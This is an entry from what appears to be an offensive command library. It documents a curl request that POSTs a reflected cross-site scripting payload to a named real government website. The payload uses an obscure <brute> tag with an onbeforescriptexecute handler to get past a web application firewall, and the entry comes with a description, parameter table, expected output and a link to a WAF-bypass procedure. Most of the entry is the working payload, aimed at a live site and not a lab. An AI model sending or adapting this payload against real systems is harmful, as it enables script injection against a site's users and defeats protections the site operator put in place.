---
id: cmd-uuid-3
data: >-
  curl -X POST 'https://www.data.gov/issue/' -d
  'media_url=catalog.data.gov/dataset/consumer-complaint-database\"%3E%3C/div%3E%3C/div%3E%3Cbrute
  onbeforescriptexecute=confirm(document.domain)>'
tags:
  - xss
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:38.802Z'
verified: false
validated: true
submitted: true
---
# curl-xss-bypass

## Command

```bash
curl -X POST 'https://www.data.gov/issue/' -d 'media_url=catalog.data.gov/dataset/consumer-complaint-database\"%3E%3C/div%3E%3C/div%3E%3Cbrute onbeforescriptexecute=confirm(document.domain)>'
```

## Description

Injects an XSS payload using obscure <brute> tag to bypass WAF and execute JS via onbeforescriptexecute.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | Encoded payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'target' -d 'param=payload'
```

## Expected Output

Reflected payload in response; JS triggers confirm in browser.

## Related

- [[procedures/Bypass-Akamai-WAF-for-Reflected-XSS]]
